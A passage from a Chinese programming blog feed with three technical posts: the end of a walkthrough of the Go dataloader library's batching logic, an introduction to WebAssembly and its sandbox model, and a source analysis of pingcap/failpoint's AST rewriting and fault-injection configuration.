batcher.end，这其实就是常规的 dataloader 加载数据的方式，它等待的时间由 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L73-L74" target="_blank" rel="noopener">Loader.wait 字段</a>决定，这个字段可以在调用 NewBatchedLoader 函数时通过 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L131-L137" target="_blank" rel="noopener">WithWait</a> 来修改，<a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L173" target="_blank" rel="noopener">默认是 16 毫秒</a>。然而，单纯的通过时间来触发回源是有风险的，因为短短的 16 毫秒就可能让 batcher.input 中积累大量的 key，这些 key 会一起传递给回源函数，从而给下游造成压力，因此我们需要有一种机制来控制每次回源的 key 的数量，并在 batcher 积累了足够的数量后提前回源，从而不影响后续的 key 进入<strong>新的 batcher</strong>，而这就是 batcher.end 的另一种使用方式，它被定义在 Loader.Load 中。</p><p>具体而言，在调用 NewBatchedLoader 函数时可以通过传递 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L117-L122" target="_blank" rel="noopener">WithBatchCapacity</a> 来修改 Loader.batchCap，即单次回源可以接受的最大 key 数量，和 Loader.inputCap 不同，这个值默认值为 0，表示不作限制。当它大于 0 时，Loader 会在 Loader.count 中记录当前已经传递给 batcher 的 key 数量，当 Loader.count 达到 Loader.batchCap 时立即调用 batcher.end 方法来触发回源，并通过 Loader.reset 来将 batcher 赋值为 nil，这样当新的 key 到来时，新的 batcher 就会被创建。由于 batcher.end 是幂等的，所以即便放任 Loader.sleeper 正常执行也没有关系，但如果 Loader.wait 的值很大，那么可能会导致 goroutine 数量持续增高，因此当 Loader 因为达到 batchCap 而提前回源时，终止 Loader.sleeper 的执行是必要的，这通过一个监听了两个 channel 的 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L471-L477" target="_blank" rel="noopener">select</a> 来实现。</p><p>完整看下来，可以发现 Loader.Load 对 key 的去重完全依赖缓存，而 dataloader 使用的缓存是可以修改的（通过 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L110-L115" target="_blank" rel="noopener">WithCache</a> 实现），所以根据缓存的容量、逐出策略的不同，很可能重复的 key 在缓存中却读不到对应的 Thunk（更极端的，dataloader 还提供了 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/cache.go#L13-L28" target="_blank" rel="noopener">NoCache</a> 来适应一些特殊场景），此时 batcher 中就会有重复的 key，因此传递给回源函数的 key 列表中也会有重复的元素。在 dataloader 中，回源函数被定义为 <a href="https://github.com/graph-gophers/dataloader/blob/v6.0.0/dataloader.go#L30-L34" target="_blank" rel="noopener">BatchFunc 类型</a>，它的注释中提到 dataloader 会保证传给它的 key 列表中没有重复元素，这个说法是不严谨的，因此如果你使用了这个库，那么在编写 BatchFunc 时可能需要注意这一点，必要时需要手动进行去重。</p><p>到此为止，我们就分析完了 Loader.Load 这个核心方法，dataloader.Interface 的其他方法相对比较简单，这里就不进行分析了，有兴趣的朋友可以继续阅读相关的部分，也欢迎一起交流。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 WebAssembly</title>
      <link href="/2023/02/26/WebAssembly/"/>
      <url>/2023/02/26/WebAssembly/</url>
      
        <content type="html"><![CDATA[<p>最近阅读了 MDN 上 WebAssembly（以下简称 wasm）相关的<a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts" target="_blank" rel="noopener">内容</a>，也用 node 做了一些相关的测试，算是基本了解了 wasm 这门技术的背景与使用方法，于是写下这篇文章做一下总结。</p><p>首先要明确的是，wasm 是什么呢？看到这个名字，很多人会把它和 Web 联系在一起，但事实上 Assembly 更适合用来描述它的定位。我认为比较合适的说法是，它是一套虚拟指令集，通过配合相应的虚拟机就可以完成程序员编码出的任务。具体而言，wasm 是一种基于栈机的指令集。</p><p>这里简单解释下栈机，根据我的了解，虚拟机可以被分为栈机、累加器机和寄存器机，区分它们的一个重要方式在于读写操作数的方式。栈机在逻辑上存在一个操作栈，取数时会把操作数入栈，计算时会从栈顶取数并把结果入栈；累加器机在计算时则需要将操作数加载到累加器上，基于这个累加器做运算，然后再把结果保存到存储单元上；寄存器机则提供了很多高速的寄存器，如果操作数不多完全可以基于寄存器来做运算，我们现在使用的个人电脑就是寄存器机。</p><p>回到正题，正因为 wasm 是一套指令集，所以它可以作为各种语言的目标语言，比如 LLVM 就提供了从 LLVM-IR 到 wasm 的编译支持，这意味着只要某种语言可以被编译成 LLVM-IR，那么它就可以继续被编译成 wasm。除此之外，wasm 还定义了一种 wat 作为后缀名的文件，里面可以通过一种 S 表达式方式的语法来编写<a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Reference" target="_blank" rel="noopener">既定的指令</a>，这些指令可以被诸如 wabt 这样的工具编译成 wasm 的二进制文件，下面是一个简单的 wat 程序，它提供一个 add 函数用于计算两个数字的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">    (func (export &quot;add&quot;) (param $x i32) (param $y i32) (result i32)</span><br><span class="line">        local.get $x</span><br><span class="line">        local.get $y</span><br><span class="line">        i32.add</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>但如果 wasm 仅仅是作为一种虚拟指令集被提出，那它的价值也许没有那么大，一个帮助 wasm 从虚拟指令集中脱颖而出的重要原因，是浏览器的 JavaScript 原生支持 wasm 的加载与执行。比如我们将上面的 wat 文件编译为 wasm 二进制，假设命名为 main.wasm，那么我们就可以使用如下的代码在 JavaScript 中使用这个函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WebAssembly.instantiateStreaming(fetch(<span class="string">"main.wasm"</span>), &#123;</span><br><span class="line">  <span class="comment">// 这里用来向 wasm 提供一些 JavaScript 内容</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">obj</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> ret = obj.instance.exports.add(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 调用导出的 add 函数拿到计算结果</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"get result:"</span>, ret) <span class="comment">// 输出这个结果</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">"failed to run wasm, err:"</span>, err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>现代的 Web 应用太复杂了，JavaScript 作为实现网页动态交互的核心语言，在保证了灵活性的同时却很难兼顾性能。举例来说，对于一个返回常量 1 的函数 getOne，静态语言可以直接将其内联优化，但 JavaScript 不能简单地这样做，因为它无法保证 getOne 在运行期间会被赋值成什么东西，也许是一个返回其他值的函数，或者也许都不是一个函数了。尽管这种特性在一些场景下为代码的编写带来了方便，但在另一些特定场景下，我们并不需要这种动态特性，一个重要的领域就是计算场景，在这里我们能够确定参数的类型，只是需要做大量的复杂计算，而这就是 wasm 大放异彩的地方，在这个场景下它可以提供超过 Js 的性能。</p><p>此外，由于浏览器加载的是 wasm，但它并不关注这个 wasm 是怎么得到的，这意味着我们可以用任意一种语言来编写代码，然后将它们编译成 wasm 让浏览器来执行。更有趣的是，JavaScript 可以执行 wasm 提供的函数，wasm 也可以执行 JavaScript 提供的函数。基于这两点，我们就可以做到更多有趣的事情。比如我们可以在 Js 中封装一些 DOM 操作并提供给 wasm，然后通过其他语言来使用这些函数，这样我们就有了通过各种语言操作 DOM 的能力，也就是说，网页的编写就不会只限制在传统的三剑客（HTML、CSS、JavaScript），其他语言也可以参与进来。在这个思路上已经有一些实践，比如 golang 提供了 wasm 作为编译目标，且提供了对 DOM 的封装，又比如 <a href="https://www.vugu.org/" target="_blank" rel="noopener">vugu</a> 这个项目，让 HTML 可以与 golang 中的结构相互配合。</p><p>除此之外，wasm 一个更广为流传的特点就是它的安全性，也就是所谓的“沙箱”。具体而言，wasm 能够访问的资源是外部可控的，在这其中首先应该被讨论的就是内存。每一个 wasm 可以拥有属于自己的一段内存，这段内存可以从外部导入，比如 JavaScript 提供了 <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Memory" target="_blank" rel="noopener">WebAssembly.Memory</a> 对象供 wasm 使用，也可以由 wasm 自己主动申请，不过二者只能选一个，但不论是哪一种，当前 wasm 能够使用的最大内存大小是 4GB，你可以通过 <code>new WebAssembly.Memory({ initial: 1, maximum: 65537 })</code> 这样一条 Js 语句来验证这个问题，wasm 的内存是分页的，一页 64 KB，所以最多能够申请 65536 页，这里尝试申请 65537 页，所以它会抛出 RangeError 的异常。</p><p>此外你有可能想到，wasm 是基于栈机的，所以我们可以在里面写一个无限循环，循环体中不停地向栈中压入内容来试图触发栈溢出，但我自测时是没有问题的，比如对于下面的代码就可以一直执行下去：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">    (func (export &quot;main&quot;)</span><br><span class="line">        (loop $my_loop</span><br><span class="line">            i32.const 10086</span><br><span class="line">            br $my_loop</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我个人猜测是因为 br 每次跳回 loop 时都会清理掉这次循环对应的逻辑栈的内容，所以 <code>i32.const 10086</code> 这个声明事实上只在逻辑栈中占用 4 个字节的位置，但我没有找到相关的官方描述。</p><p>除了内存以外，wasm 也没有能力直接访问其他系统资源，比如网络、磁盘等，除非宿主环境主动向其提供这些能力。我们知道，现代操作系统中的进程如果想要访问系统资源，是需要通过系统调用借助内核来完成的，wasm 也有类似的东西，这个东西被称为 WASI，也就是 WebAssembly System Interface。事实上，由于宿主机环境可以自由向 wasm 导入函数，所以为了访问网络、磁盘，我们完全可以封装一个函数然后提供给 wasm，WASI 的原理也是这个，但它更大的意义在于提供了一种标准，而标准和实现是分离的，标准的存在可以让各种实现能够更好地相互配合。</p><p>进程通过系统调用来通过内核访问系统资源，wasm 通过 WASI 来通过宿主环境访问系统资源，那么它们的区别在于什么呢？最核心的区别在于，宿主环境可以灵活而轻量地控制 wasm 可以使用哪些能力，以 JavaScript 为例，wasm 被加载后对应一个 <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Module" target="_blank" rel="noopener">WebAssembly.Module</a> 对象，也即一个模块，而它被运行时需要生成一个对应的 <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Instance" target="_blank" rel="noopener">WebAssembly.Instance</a> 对象，一份 wasm 二进制在 Js 中可以对应多个 Instance，每个 Instance 在运行时可以导入不同的 Js 函数，所以即便是同一份 wasm 二进制文件，它在运行时的表现也可能是不一样的，而它的表现完全由宿主环境来决定。</p><p>把这个特性放到应用层的代码上，当我们用高级语言导入一个外部模块时，如果不去阅读它的代码，我们不能保证这个模块会带来怎样的影响，比如它可能在启动时随机删除我们计算机上的文件，甚至通过网络下载病毒到本地并运行；但如果我们使用一个外部的 wasm，在运行时不给它提供网络访问、磁盘访问的能力，那么就可以保证它无法通过这些来危害我们的设备。</p><p>wasm 本身并不复杂，但它提供了很多有意思的特性，这些特性间的组合就能带来很多可能性。我们再举个例子，上面提到 Js 中有 WebAssembly.Memory 对象，如果将它导入给 wasm，wasm 就可以使用它对应的一段内存，这包括读和写，而 Js 也可以通过这个对象来获取里面的内容，从而达到 Js 与 wasm 交换大片数据的效果。那么如果同一个 Memory 对象被多个 wasm 使用会发生什么呢，不难想到，wasm 之间就有了交换数据的方式，因为它们共享同一块内存，基于这一点，就可以实现类似动态链接的效果。所以我们在进程中运行多个 wasm 实例，就类似于在一个操作系统中运行多个进程，正是因为这种相似性，所以有了 nano process 等概念被提出。而由于进程间的交互可以以服务的维度分隔，所以有了微服务的后端部署方式，对应到 wasm，就有了纳服务（nano service）等概念被提出。</p><p>总结而言，由于 wasm 的沙箱特性，以及它可以与各种语言交互，并可以由各种语言编译而成，所以未来一定会在很多领域发挥重要作用。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 pingcap/failpoint 源码</title>
      <link href="/2023/02/10/failpoint/"/>
      <url>/2023/02/10/failpoint/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>golang 是一门设计非常优良的语言，它提供了 <code>go/ast</code>、<code>go/parser</code> 等一系列标准库来解析自身，通过这些工具的相互配合，使用者可以从一份标准的 golang 源码获取其对应的 AST 表示，并基于 AST 来做具体的业务逻辑。尽管 golang 的语法很简单，但其 AST 的构成依然比较复杂，所以我一直想找到一个应用了 AST 的项目来学习，而 pingcap 的 <a href="https://github.com/pingcap/failpoint/tree/2eaa328" target="_blank" rel="noopener">failpoint</a> 就是这样一个项目。</p><p>在正式开始之前，先安利下 <a href="https://astexplorer.net/" target="_blank" rel="noopener">https://astexplorer.net/</a> 这个网站，它提供各种语言的 “源码 -&gt; AST” 的实时转换，并可以同步高亮两边的内容，用来了解各种代码的语法树结构非常方便。</p><h1 id="failpoint-的使用方式"><a href="#failpoint-的使用方式" class="headerlink" title="failpoint 的使用方式"></a>failpoint 的使用方式</h1><p>在 failpoint 的代码库中，failpoint-ctl 这个目录下有一个 main.go 文件，如果你在代码库目录中执行 make 命令，就会以这个 main.go 为入口文件构建一个 cli 工具。这个工具提供 enable 和 disable 两个命令，前者驱动 failpoint 的代码重写器，后者驱动 failpoint 将重写后的代码恢复到原来的样子。</p><p>当你在自己的代码中引入 failpoint，并使用了它的 Marker 函数编写自己的故障注入逻辑后，对代码目录执行 <code>failpoint-ctl enable</code> ，failpoint 就会把文件中的 Maker 函数替换成一些有意义的节点，这个重写后的文件会替代原来的文件，而原文件的名字后面会加上 <code>__failpoint_stash__</code> 的后缀，因为这样在编译时新老文件就不会相互影响。</p><p>failpoint 作为一个外部库，提供了一些 Marker 函数供用户使用，其中最重要的是<code>failpoint.Inject</code> 和 <code>failpoint.InjectContext</code>。以 Inject 函数举例，假设有如下代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">failpoint.Inject(<span class="string">"test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(_ failpoint.Value)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"hello world"</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在经过 failpoint-ctl 的代码重写后，这个代码就会变成下面的样子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> _, _err_ := failpoint.Eval(_curpkg_(<span class="string">"test"</span>)); _err_ == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"hello world"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>_cur_pkg_</code> 起到类似宏一样的效果，作用是在用户提供的字符串中添加文件所在的包前缀，这样即便不同的包使用了相同的自定义字符串，也不会相互影响。另外，Inject 函数的第二个参数是一个 <code>interface{}</code>，所以虽然这里需要提供一个函数，但这个函数的签名有多种选择，比如可以直接不提供 failpoint.Value。</p><p>除此之外，还有一些用于辅助 Inject 的 Marker 函数，比如 <code>failpoint.Break</code>，<code>failpoint.Label</code>，<code>failpoint.Continue</code> 等等，你会发现这些函数的名字和 golang 中的关键字是一样的，这不是巧合，因为它们确实是以对应的 golang 关键字的形式来生效的。事实上，这些 Marker 都是空函数，所以在正常情况下它们会被编译器优化掉，但对于 golang 的 AST 而言，它们都是能被解析到的树上的节点，所以 failpoint 在遍历 AST 时可以对它们做进一步的处理。</p><p>总而言之，通过组合 failpoint 提供的各种 Marker 函数，就可以构建一条完整的程序执行链路，这条链路在代码重写前会被编译器优化掉（也就等于没有这条链路），而代码重写后则会实实在在的影响程序的流程。通常而言，这条重写后的链路以 Inject 中第二个参数对应的函数为起点（在重写后它变成了 Eval 的 if 语句块），而这个函数能否被执行则取决于 Inject 的第一个参数。</p><p>Inject 的第一个参数是一个被称为 failpath 的自定义字符串，前面提到这个字符串在代码重写后会自动加上包名作为前缀，所以你不用担心自己定义的字符串会与其他包中已有的 failpath 相互冲突。在 Inject 被重写成 Eval 后，当且仅当对应的 if 为 true 时才会执行用户自定义的逻辑，那么如何将这个 if 变成 true 呢，failpoint 提供了环境变量与 HTTP 两种方式，这部分放到后面的小节来展开讲。</p><h1 id="代码重写实现"><a href="#代码重写实现" class="headerlink" title="代码重写实现"></a>代码重写实现</h1><h2 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h2><p>如前所述，代码重写的目的在于将 Marker 函数转变为有意义的 golang 关键字或 Eval 函数调用，这部分逻辑被定义在 code/rewriter.go 和 code/expr_rewriter.go 中，与之相对的，code/restorer.go 用于实现代码的恢复。</p><p>先来看 rewriter 的逻辑，它的 <a href="https://github.com/pingcap/failpoint/blob/master/code/rewriter.go#L666" target="_blank" rel="noopener">Rewrite</a> 方法被 main.go 所驱动，所以这是代码重写器的逻辑入口，这个函数的最终目的是获取某个 path 下的一批文件，针对这些文件调用 <a href="https://github.com/pingcap/failpoint/blob/master/code/rewriter.go#L579" target="_blank" rel="noopener">RewriteFile</a> 方法。具体来说，Rewrite 方法寻找那些<a href="https://github.com/pingcap/failpoint/blob/master/code/rewriter.go#L703-L706" target="_blank" rel="noopener">引入了 failpoint</a> 的 <a href="https://github.com/pingcap/failpoint/blob/master/code/rewriter.go#L675" target="_blank" rel="noopener">go 源码文件</a>，因为只有这些文件才有可能使用各种 Marker 函数，由于这里仅需要判断“是否引入了 failpoint” 这个问题，所以调用 <code>parser.ParseFile</code> 时传递了 <code>parser.ImportsOnly</code> 选项，代表仅仅解析文件的 ImportSpec 节点。</p><p>RewriteFile 方法首先用当前解析的文件<a href="https://github.com/pingcap/failpoint/blob/master/code/rewriter.go#L593-L612" target="_blank" rel="noopener">初始化 Rewriter 结构中的一些字段</a>，然后找出 file.Decls 中的 FuncDecl，即函数定义，并对它们<a href="https://github.com/pingcap/failpoint/blob/master/code/rewriter.go#L619" target="_blank" rel="noopener">调用 rewriteFuncDecl</a> 进行语法树的重写，除此之外，RewriteFile 还完成 Binding 文件的写入（即 _cur_pkg_ 这个“宏”的定义）、重命名原文件（在文件名后面添加后缀）以及将改写后的 AST 写入与原文件同名的文件（通过 format.Node 函数实现）等一系列工作，当 Rewrite 对找出的所有目标文件都调用了 RewriteFile 后，整体的代码重写就完成了。</p><p>从 <a href="https://github.com/pingcap/failpoint/blob/master/code/rewriter.go#L571-L576" target="_blank" rel="noopener">rewriteFuncDecl</a> 方法开始，failpoint 就开始处理语法树上的节点了，这里没有直接使用 golang 标准库提供的 Walk 语法，而是针对一系列节点实现了 rewriteXXX 函数，比如 <code>rewriteIfStmt</code>、<code>rewriteAssign</code> 等等，从 Stmt 开始一层一层地处理 AST。为什么没有直接使用 Walk 呢，因为在遍历的过程中需要对节点做修改，而且还要能够感知父节点，而这些用 Walk 来做会非常麻烦。</p><p>这一系列的 rewrite 非常好地覆盖了所有能够出现 Marker 函数的地方，是学习 golang AST 的绝佳样例。而这些 rewrite 的尽头是被定义在 code/expr_rewriter.go 中的 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/code/expr_rewriter.go#L26-L35" target="_blank" rel="noopener">exprRewriters</a>，这是一个 map，key 是 Marker 函数的名字，value 是对应的重写方法。当 failpoint 遍历到 SelectorExpr 节点时，会判断是否为 <code>failpoint.XXX</code> ，并<a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/code/rewriter.go#L318-L322" target="_blank" rel="noopener">使用 XXX 到 exprRewriters 这个 map 中去寻找对应的重写函数，然后调用它来完成代码的重写</a>。</p><p>在调用这些重写函数时，failpoint 将 CallExpr 传了下来，这是重写函数对应 AST 节点的父节点，所以能够直接通过修改这个父节点来将 Marker 函数从 AST 中剔除掉。重写函数的逻辑基本相同，都是对 AST 做一些校验，然后构建新的节点来完成替换，这里以 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/code/expr_rewriter.go#L37" target="_blank" rel="noopener">rewriteInject</a> 方法为例来过一下代码重写的过程，其他函数基本同理。</p><p>我们前面给出了 Inject 函数的使用方式，它需要接受两个参数，分别是 failpath 与一个自定义的函数，通常来讲，编译器或 IDE 能够保证这个函数调用的合法性，不过 rewriteInject 中还是通过判断 CallExpr.Args 的长度来再次保证了下。验证完长度后，rewriteInject 从 CallExpr.Args 中取出了这两个参数，第一个参数只要保证是一个 Expr 即可，因为生成的 Eval 函数调用的第一个参数接受的也是一个 Expr，所以这里不需要去确认具体的 Expr 类型。而第二个参数的要求则相对严格，它只能是 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/code/expr_rewriter.go#L55-L66" target="_blank" rel="noopener">nil、没有参数的函数和接受一个 failpoint.Value 参数的函数</a>这三种类型中的某一个。在验证完了参数的合法性后，rewriteInject 就会生成一系列的 AST 节点，这些节点就代表上文所述的 if 中调用 Eval 的代码，以及从 Inject 的自定义函数中提取出来的函数体内容。</p><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><p>与代码重写不同，代码的恢复就比较简单了，如果你只想要将代码恢复到重写前的样子，只需要用 xxx.go__failpoint_stash__ 覆盖 xxx.go，然后删除 _cur_pkg_ 所在的文件即可。不过 failpoint 没有做得这么粗暴，它在实现上读取了覆盖前的文件内容，记为 a，然后用 Rewriter 的 Rewrite 方法获取a 对应的重写后的内容 b，而此前 a 已经有一份被保存到文件中的重写后的内容 c，所以 failpoint 会对 b 和 c 做一个 diff，找出 c 在 b 的基础上做的修改，然后将它应用到 a 中。这样做的好处在于，如果你在代码重写后修改了 c，只要代码所在的行数没有发生变化，那么在恢复时这个修改就可以继续保留下来。</p><h1 id="故障注入实现"><a href="#故障注入实现" class="headerlink" title="故障注入实现"></a>故障注入实现</h1><p>通常而言，failpoint 的使用者使用 Inject 函数的第一个参数，也就是 failpath 来标识一种故障，当然多个 Inject 的调用可以传递相同的 failpath，这时如果启用了这个 failpath，那么这些 Inject 都会被执行到。如前所述，Inject 函数在经历 AST 重写后会变成 Eval 函数，所以我们可以通过查看<a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoints.go#L268-L276" target="_blank" rel="noopener">这个函数的代码</a>来了解故障注入是如何发生的。</p><p>可以看到，Eval 的逻辑其实很简单，它直接调用了 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoints.go#L200-L215" target="_blank" rel="noopener">failpoints.Eval</a> 方法，failpoint 是一个全局的 Failpoints 结构，所以对它内部字段的操作很可能会导致并发问题，因此 failpoints.Eval 首先做的事情就是加锁，然后到 failpoints.reg 中根据用户传入的 failpath（也就是传给 Inject 的第一个参数）来寻找一个 fp，然后调用这个 fp 的 Eval 方法。fp 是什么呢，根据Failpoints 结构的<a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoints.go#L85-L89" target="_blank" rel="noopener">定义</a>，我们可以发现这是一个名为 Failpoint 结构（少了一个 <code>s</code>），它被定义在源码中的 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoint.go#L39-L44" target="_blank" rel="noopener">failpoint.go</a> 文件中。继续深入到 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoint.go#L99-L112" target="_blank" rel="noopener">Failpoint.Eval</a> 这个方法中，会发现这里也是先加了个锁，然后去调用了 fp.t.eval，具体来说，是一个名为 terms 的结构的 eval 方法，而这个 terms 则大有来头。</p><p>通过梳理上面的这条链路我们就可以知道，当 Inject 被重写为 Eval 时，它最终会通过用户传递的 failpath 找到一个 terms，然后执行它的 eval 方法，这个方法会拿到一个 failpoint.Value 和一个 error，而这两个正是重写后的 AST 的 if 语句块接受的两个局部变量。不难想到，我们需要一种人为可控的方式，来把 failpath 和 terms 关联起来，从而灵活地返回不同的值来制造出不同的故障。failpoint 提供了两种，分别是环境变量和 http server。</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>failpoint 的 README.md 中有提到，可以通过给 GO_FAILPOINTS 这个环境变量传递特定格式的值，来用不同的方式启动 failpath，格式的定义是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;percent&gt;%][&lt;count&gt;*]&lt;type&gt;[(args...)][-&gt;&lt;more terms&gt;]</span><br></pre></td></tr></table></figure><p>这一坨正则表达式一样的东西看起来不怎么直观，下面来看一个具体的例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GO_FAILPOINTS='main/test=5*return("hahaha")-&gt;50%return("walalala")'</span><br></pre></td></tr></table></figure><p>这个环境变量带来的效果是，<code>main/test</code> 这个 failpath 的前五次执行会通过 failpoint.Value 返回字符串形式的 “hahaha”，此后的执行则有 50% 的概率会返回字符串形式的 “walalala”，另 50% 则什么都不做。</p><p>此外，如果想设置多个 failpath，则可以通过半角的分号来分割，比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GO_FAILPOINTS='main/test=5*return("hahaha")-&gt;50%return("walalala");main/test2=return(10086)'</span><br></pre></td></tr></table></figure><p>这个例子设置了两个 failpath，<code>main/test</code> 和上面的逻辑是一样的，但与此同时也启用了 <code>main/test2</code> 这个 failpath，它固定通过 failpoint.Value 返回数值类型的 10086。</p><p>所以，通过在运行程序前设置 GO_FAILPOINTS 这个环境变量，就可以把某个 failpath 和一种链式的逻辑绑定起来，这个链上通过 <code>-&gt;</code> 连接了一系列的具体逻辑，从前向后只要有一个能执行就会停止后面的逻辑。事实上，在代码层面这些一个个逻辑就对应一个 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L56-L66" target="_blank" rel="noopener">term</a>，而一批 term 就组成了 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L45-L54" target="_blank" rel="noopener">terms</a>，正如我们上面提到的，failpath 就是和一个 terms 结构对应起来的。</p><p>在 failpoints.go 文件中，有一个 init 函数，这个函数在程序启动时会领先于 main 函数执行，它<a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoints.go#L62-L76" target="_blank" rel="noopener">读取了 GO_FAILPOINTS 这个环境变量</a>，通过半角分号分割出不同的 failpath，然后执行 Enable 函数来完成 failpath 与 terms 的绑定。这个函数和上面提到的 Eval 相同，都是层层包装，最终调用的是 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoint.go#L52-L63" target="_blank" rel="noopener">Failpoint.Enable</a> 这个函数，而这个 Failpoint 会被注册到全局 failpoints 的 reg 中，方便 Eval 在执行时通过 failpath 查找到。</p><p>Failpoint.Enable 接受一个名为 inTerms 的参数，这个参数的值其实就是上面环境变量中等号后面那一坨，具体是指 <code>5*return(&quot;hahaha&quot;)-&gt;50%return(&quot;walalala&quot;)</code> 和 <code>return(10086)</code>，这个 inTerms 会被传递给 newTerms 函数，这个函数非常关键，它最终的效果是把这坨表达式转换成对应语义的代码，这是通过遍历 inTerms 并根据语法调用一系列的 parseXXX 来实现的。</p><p>terms 结构中有一个 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L48-L49" target="_blank" rel="noopener">term 数组</a>，<a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L111-L120" target="_blank" rel="noopener">terms.eval</a> 方法在执行时会遍历这个数组，找到第一个 allow 方法返回 true 的 term，然后调用它的 do 方法并返回执行的结果。这里 allow 的判断就对应上面的 <code>5*</code> 和 <code>50%</code>，分别通过 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L72-L80" target="_blank" rel="noopener">modCount</a> 和 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L82-L84" target="_blank" rel="noopener">modProb</a> 来实现。而 do 方法则对应上面的 <code>return(&quot;hahaha&quot;)</code>，事实上，这个在语法中被称为 type 的部分取值有很多，被定义在 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L301-L309" target="_blank" rel="noopener">actMap</a> 中，每种取值对应一个函数。以 <code>return</code> 举例，它对应的函数 <a 